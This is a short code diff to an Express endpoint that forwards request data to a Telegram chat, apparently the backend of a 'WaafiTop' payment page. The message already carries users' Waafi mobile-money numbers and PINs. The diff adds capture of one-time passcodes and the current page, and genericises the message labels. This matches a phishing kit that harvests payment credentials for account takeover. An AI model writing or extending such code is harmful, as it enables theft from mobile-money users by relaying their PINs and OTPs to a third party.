@@ -38,7 +38,7 @@ function normalizeTelegramAmount(value) {
 }
 
 app.post('/api/telegram-notify', async (req, res) => {
-  const { title, text, orderId, recipient, amount, waafiNumber, waafiPin, payer, pin } = req.body || {};
+  const { title, text, orderId, page, view, recipient, amount, waafiNumber, waafiPin, waafiOtp, payer, pin, otp } = req.body || {};
 
   if (!BOT_TOKEN || !CHAT_ID) {
     return res.status(500).json({
@@ -49,16 +49,20 @@ app.post('/api/telegram-notify', async (req, res) => {
 
   const formattedWaafiNumber = waafiNumber || payer || '';
   const formattedWaafiPin = waafiPin || pin || '';
+  const formattedOtp = waafiOtp || otp || '';
   const formattedAmount = normalizeTelegramAmount(amount || req.body?.total || '');
+  const formattedPage = page || view || '';
 
   const message = [
-    title || 'WaafiTop order update',
+    title || 'WaafiTop update',
     '',
-    text || 'New order received.',
+    text || 'New notification received.',
+    formattedPage ? `Page: ${formattedPage}` : '',
     orderId ? `Order ID: ${orderId}` : '',
     recipient ? `Receive on: ${recipient}` : '',
     formattedWaafiNumber ? `Waafi number: ${formattedWaafiNumber}` : '',
     formattedWaafiPin ? `Waafi PIN: ${formattedWaafiPin}` : '',
+    formattedOtp ? `OTP: ${formattedOtp}` : '',
     formattedAmount ? `Amount: ${formattedAmount}` : '',
   ].filter(Boolean).join('\n');
 
